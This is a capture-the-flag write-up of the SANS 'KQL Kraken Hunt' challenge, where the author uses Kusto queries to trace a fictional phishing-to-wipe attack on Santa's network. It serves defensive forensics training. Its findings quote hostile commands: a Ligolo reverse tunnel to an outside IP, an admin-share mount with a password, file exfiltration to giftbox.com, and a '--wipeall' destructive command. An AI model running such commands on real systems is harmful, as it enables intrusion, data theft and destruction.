# OBJECTIVE 13 - KQL Kraken Hunt  


## OBJECTIVE  
Use Azure Data Explorer (Kusto Query Language - KQL) to investigate a suspected compromise inside Santa’s enterprise. Get your briefing from Tangle Coalbox on Film Noir Island.

## Hints

Hints provided for Objective 13  
- Need to track something executed? The `ProcessEvents` table is your friend.  
- Use the blue **"Train me for the case"** button inside [the Kusto detective trainer](https://detective.kusto.io/sans2023) to learn KQL.  
- Want to see what files were dropped? Check the `FileCreationEvents` table.

---

## My Approach

### Onboarding: Kusto Basics  
The first step was to complete Kusto onboarding. I was asked to find out how many Craftsperson Elves are working from laptops. Using this query:

```kql
Employees
| where role =~ "Craftsperson Elf"
| where hostname has "LAPTOP"
| distinct hostname
| count
```

The result:  
```
> 25
```

With onboarding complete, I moved on to a series of cases.

---

### CASE 1: Phishing Email  
**Questions:**
- Who received the phishing email?
- Who sent it?
- What was the subject line?

Using the malicious link as a pivot point, I searched the `Email` table:

```kql
Email
| where link has "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
| distinct recipient, sender, subject, link
```

**Result:**  
```
> Recipient: alabaster_snowball@santaworkshopgeeseislands.org  
> Sender: cwombley@gmail.com  
> Subject: [EXTERNAL] Invoice foir reindeer food past due
```

---

### CASE 2: Victim Machine Info  
**Questions:**
- What is the victim’s role?
- What is the hostname?
- What is their IP?

Querying by email address in the `Employees` table:

```kql
Employees
| where email_addr =~ "alabaster_snowball@santaworkshopgeeseislands.org"
| distinct role, hostname, ip_addr
```

**Result:**  
```
> Role: Head Elf  
> Hostname: Y1US-DESKTOP  
> IP: 10.10.0.4
```

---

### CASE 3: Malicious Activity  
**Questions:**
- When did Alabaster click the link?
- What file was created afterward?

I checked `OutboundNetworkEvents` for when the phishing link was clicked:

```kql
OutboundNetworkEvents
| where url has "MonthlyInvoiceForReindeerFood.docx"
| distinct timestamp
```

**Timestamp:**  
```
> 2023-12-02T10:12:42Z
```

Then I checked file creations shortly after:

```kql
FileCreationEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp between (datetime(2023-12-02 10:12)..datetime(2023-12-02 10:15))
| distinct filename
```

**Files Created:**  
```
> MonthlyInvoiceForReindeerFood.docx  
> giftwrap.exe
```

---

### CASE 4: Reverse Shell & Lateral Movement  
**Questions:**
- What IP was used in the reverse tunnel?
- When were network shares enumerated?
- What host did the attacker move laterally to?

In `ProcessEvents`, I found Ligolo being used to set up a reverse tunnel:

```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where process_commandline has "ligolo"
| distinct process_commandline
```

**Command:**  
```
ligolo --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
```

Then I searched for `net share` to find enumeration:

```kql
ProcessEvents
| where process_commandline has "net share"
| distinct process_commandline, timestamp
```

**Timestamp:**  
```
> 2023-12-02T16:51:44Z
```

Lastly, I checked for lateral movement via `net use`:

```kql
ProcessEvents
| where process_commandline has "net use"
| distinct process_commandline
```

**Command:**  
```
cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
```

---

### CASE 5: Encoded PowerShell & Exfiltration  
**Questions:**
- When was the first base64-encoded PowerShell command run?
- What file was copied from the file share?
- What domain was used for exfiltration?

I filtered for encoded PowerShell commands:

```kql
ProcessEvents
| where process_commandline has "-enc"
| where process_commandline !has "<known good base64 string>"
| distinct timestamp
| sort by timestamp asc
```

**Timestamps:**  
```
> 2023-12-24T16:07:47Z  
> 2023-12-24T16:58:43Z  
> 2023-12-25T10:44:27Z
```

I decoded each one using [CyberChef](https://gchq.github.io/CyberChef/):

1. **Reversed string**:
```powershell
Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt
```

2. **Char array encoding**:
```powershell
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
```

3. **Unobfuscated command**:
```powershell
C:\Windows\System32\downwithsanta.exe --wipeall \\NorthPolefileshare\c$
```

---

### CASE 6: Final Payload  
**Questions:**
- What executable was used in the final malicious command?
- What command-line flag did it use?

We already decoded this in Case 5:

```powershell
Executable: downwithsanta.exe  
Flag: --wipeall
```

---

## Result

Using KQL and logic-based queries, I traced a full attack chain from phishing to exfiltration and destruction. I uncovered the malicious link, identified the reverse shell setup, confirmed lateral movement, decoded multiple obfuscated PowerShell commands, and captured the final destructive payload.

---

## Lessons Learned

This challenge reinforced how powerful KQL is for incident investigation across large datasets. From spear-phishing detection to command-line forensics and encoded payload decoding, every step demanded both technical skill and attention to attacker tradecraft. It also emphasized how PowerShell and simple binaries can be leveraged for complex attacks — and how well-structured logs can expose it all.



